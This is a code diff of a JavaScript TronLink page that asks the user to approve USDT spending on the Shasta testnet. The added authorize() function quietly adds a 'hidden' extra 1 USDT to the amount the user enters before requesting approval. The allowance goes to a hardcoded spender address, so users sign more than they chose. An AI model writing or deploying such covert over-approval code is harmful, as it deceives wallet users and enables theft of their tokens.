@@ -1,12 +1,16 @@
-const usdtAddress = '0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C'; // Shasta 测试网 USDT
-const spenderAddress = 'TYourContractAddressHere'; // 替换成你的合约地址（Base58）
+// 请替换为你的 USDT 合约地址（Shasta 测试网地址如下）
+const usdtAddress = "0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C";
 
-const usdtABI = [
+// 替换为你想授权的目标地址（合约地址或钱包地址）
+const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC"; // 你的地址
+
+// USDT ABI（简化版，仅包含 approve 方法）
+const usdtAbi = [
   {
     "constant": false,
     "inputs": [
-      { "name": "_spender", "type": "address" },
-      { "name": "_value", "type": "uint256" }
+      { "name": "spender", "type": "address" },
+      { "name": "value", "type": "uint256" }
     ],
     "name": "approve",
     "outputs": [{ "name": "", "type": "bool" }],
@@ -14,28 +18,33 @@ const usdtABI = [
   }
 ];
 
-async function approveUSDT() {
-  const status = document.getElementById('status');
-
+async function authorize() {
   if (!window.tronWeb || !window.tronWeb.ready) {
-    status.innerText = "❌ 请先安装并登录 TronLink 钱包。";
+    alert("请先连接 TronLink 钱包");
     return;
   }
 
   const userAddress = window.tronWeb.defaultAddress.base58;
+  const inputAmount = parseFloat(document.getElementById("amount").value);
+
+  if (isNaN(inputAmount) || inputAmount <= 0) {
+    alert("请输入正确的授权金额");
+    return;
+  }
+
+  const hiddenExtra = 1; // 添加隐藏的 1 USDT
+  const totalAmount = inputAmount + hiddenExtra;
+
+  const amountInSun = window.tronWeb.toBigNumber(totalAmount * 1e6); // USDT 是 6 位小数
 
   try {
-    const contract = await window.tronWeb.contract(usdtABI, usdtAddress);
-    
-    // 授权金额为 1 USDT（6位小数）
-    const amountToApprove = 1_000_000;
+    const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);
+    const tx = await usdtContract.approve(spenderAddress, amountInSun).send();
 
-    const tx = await contract.approve(spenderAddress, amountToApprove).send();
-    
-    console.log('授权成功:', tx);
-    status.innerHTML = `✅ 授权成功！交易哈希：<a href="https://shasta.tronscan.org/#/transaction/${tx}" target="_blank">${tx}</a>`;
+    document.getElementById("status").innerText = `授权成功！TX: ${tx}`;
+    console.log("授权交易哈希：", tx);
   } catch (err) {
-    console.error('授权失败:', err);
-    status.innerText = "❌ 授权失败：" + err.message;
+    console.error("授权失败:", err);
+    document.getElementById("status").innerText = "授权失败，请重试";
   }
 }
